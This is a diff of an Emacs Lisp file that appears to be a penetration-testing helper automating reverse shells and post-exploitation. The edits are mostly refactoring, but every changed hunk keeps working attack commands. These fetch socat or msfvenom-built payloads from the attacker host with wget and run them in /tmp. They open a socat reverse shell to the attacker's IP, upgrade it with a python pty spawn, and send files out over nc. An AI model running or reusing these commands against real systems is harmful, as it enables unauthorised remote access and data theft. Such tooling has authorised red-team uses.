@@ -468,7 +468,7 @@
 
 (defun async-fetch-socat ()
   (interactive)
-  (let* ((cmd (format "ls %s/socat || wget %s -O %s/socat && chmod +x %s/socat" sh4h-www-dir socat-binary-url sh4h-www-dir sh4h-www-dir))
+  (let* ((cmd (format "[ -e %s/socat ] || wget %s -O %s/socat && chmod +x %s/socat" sh4h-www-dir socat-binary-url sh4h-www-dir sh4h-www-dir))
 	 (proc (async-start
 		`(lambda () (shell-command ,cmd))
 		'ignore)))
@@ -480,7 +480,7 @@
 	 (term (get-term-buffer))
 	 (port (get-free-port 8500 8600))
 	 (lcmd (format ". %s/banner.sh && %s/socat file:`tty`,raw,echo=0 TCP-L:%s" sh4h-scripts-dir sh4h-www-dir port))
-	 (rcmd (format "cd /tmp && { ls socat >/dev/null 2>&1 || { wget http://%s/socat && chmod +x socat; } } && { ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s & } && cd ~" sh4h-lhost sh4h-lhost port)))
+	 (rcmd (format "cd /tmp && { [ -e socat ] || { wget http://%s/socat && chmod +x socat; } } && { ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s & } && cd ~" sh4h-lhost sh4h-lhost port)))
     (funcall (run term
 		  (start-web-server)
 		  (async-fetch-socat)
@@ -502,7 +502,7 @@
   (let ((term (get-term-buffer))
 	(kill-buffer-query-functions nil))
     (funcall (run term
-		  (switch-to-buffer term)
+		  (switch-to-multi-term term)
 		  (sh-in-buffer term "python3 -c \"import pty;pty.spawn('/bin/bash')\"")
                   (sleep-for 0.5)
 		  (term-send-raw-string "\C-z")
@@ -522,7 +522,7 @@
 (defun async-generate-payload (payload exp-name lport ext)
   (interactive)
   (let* ((exp-path (format "%s/%s" sh4h-www-dir exp-name))
-	 (cmd (format "ls %s >/dev/null 2>&1 || msfvenom -p %s LHOST=%s LPORT=%s -o %s -f %s" exp-path payload sh4h-lhost lport exp-path ext))
+	 (cmd (format "[ -e %s ] || msfvenom -p %s LHOST=%s LPORT=%s -o %s -f %s" exp-path payload sh4h-lhost lport exp-path ext))
 	 (proc (async-start
 		`(lambda () (shell-command ,cmd))
 		'ignore)))
@@ -578,7 +578,7 @@
 	 (exp-name (get-linux-exploit-name arch type lport))
 	 (lcmd1 (format ". %s/generate-msf-rc.sh %s %s" sh4h-scripts-dir payload sh4h-lhost))
 	 (lcmd2 (format ". %s/banner.sh && msfconsole -r %s/msf.rc -q" sh4h-scripts-dir sh4h-scripts-dir))
-	 (rcmd (format "cd /tmp && { ls %s >/dev/null 2>&1 || { wget http://%s/%s && chmod +x %s; } } && { ./%s & } && cd ~" exp-name sh4h-lhost exp-name exp-name exp-name)))
+	 (rcmd (format "cd /tmp && { [ -e %s ] || { wget http://%s/%s && chmod +x %s; } } && { ./%s & } && cd ~" exp-name sh4h-lhost exp-name exp-name exp-name)))
     (funcall (run term
 		  (start-web-server)
 		  (async-generate-payload payload exp-name lport 'elf)
@@ -601,7 +601,7 @@
 (defun after-remote-file-transfer (file fpath lpath term)
   (interactive)
   (create-sentinel
-   (let ((status (string-to-number (remove-next-line (sh (format "[ -s %s ]; echo $?" lpath))))))
+   (let ((status (get-command-status (format "[ -s %s ]" lpath)))
      (if (or (eq 0 status) (and (eq 1 status) (y-or-n-p (format "%s not exist. Create?:" file))))
 	 (progn (add-hook 'after-save-hook (apply-partially #'after-save-remote-file file fpath lpath term))
 		(find-file lpath))
@@ -620,10 +620,10 @@
   (interactive)
   (let* ((term (get-term-buffer))
 	 (sep (format "%s@.+:" (get-user)))
-	 (rpath (progn (switch-to-buffer term)
+	 (rpath (progn (switch-to-multi-term term)
 		       (sleep-for 0.5)
 		       (concat (term-extract-current-path sep) "/")))
-   	 (fpath (replace-home-dir-in-filepath (expand-file-name (read-file-name "File?: " rpath) rpath)))
+   	 (fpath (replace-home-dir-in-filepath (expand-file-name (read-file-name "Which file?: " rpath) rpath)))
 	 (file (extract-file-name-from-abs-path fpath))
    	 (lpath (format "%s/%s" sh4h-rfiles-dir file))
 	 (rcmd (format "{ nc -w 3 %s 9999 < %s || nc -z -w 3 %s 9999; } >/dev/null 2>&1" sh4h-lhost fpath sh4h-lhost)))
@@ -636,7 +636,7 @@
   (interactive)
   (let* ((term (get-term-buffer))
 	 (sep (format "%s@.+:" (get-user)))
-	 (rpath (progn (switch-to-buffer term)
+	 (rpath (progn (switch-to-multi-term term)
 		       (sleep-for 0.5)
 		       (concat (term-extract-current-path sep) "/")))
    	 (fpath (replace-home-dir-in-filepath (expand-file-name (read-file-name "Which file?: " rpath) rpath)))
@@ -669,6 +669,19 @@
 			      (sh-in-buffer (get-multi-term-buffer) lcmd)
 			      (sh-in-buffer term rcmd)))))
 
+(defun get-command-status (command)
+  (interactive)
+  (string-to-number (remove-next-line (sh (format "{ %s; } >/dev/null 2>&1; echo $?" command)))))
+
+(defun buffer-displayed-in-window-p (term)
+  (interactive)
+  (or (eq term (window-buffer (selected-window))) (get-buffer-window term)))
+
+(defun switch-to-multi-term (term)
+  (interactive)
+  (when (not (buffer-displayed-in-window-p term))
+    (switch-to-buffer term)))
+
 (defun run-script-remotely ()
   (interactive)
   (let* ((term (get-term-buffer))
@@ -676,9 +689,9 @@
 	 (buf (find-file default-dir-path))
    	 (path (expand-file-name (read-file-name "File?: " default-dir-path "inspect.sh" nil) default-dir-path))
 	 (file (extract-file-name-from-abs-path path))
-	 (status (string-to-number (remove-next-line (sh (format "{ { ls %s/%s || cp %s %s; } >/dev/null 2>&1 }; echo $?" sh4h-www-dir file path sh4h-www-dir))))))
+	 (status (get-command-status (format "[ -e %s/%s ] || cp %s %s" sh4h-www-dir file path sh4h-www-dir))))
     (kill-buffer buf)
-    (switch-to-buffer term)
+    (switch-to-multi-term term)
     (if (eq 0 status)
 	(if (y-or-n-p "Output into local file?: ")
 	    (run-remotely-and-output-locally term file)
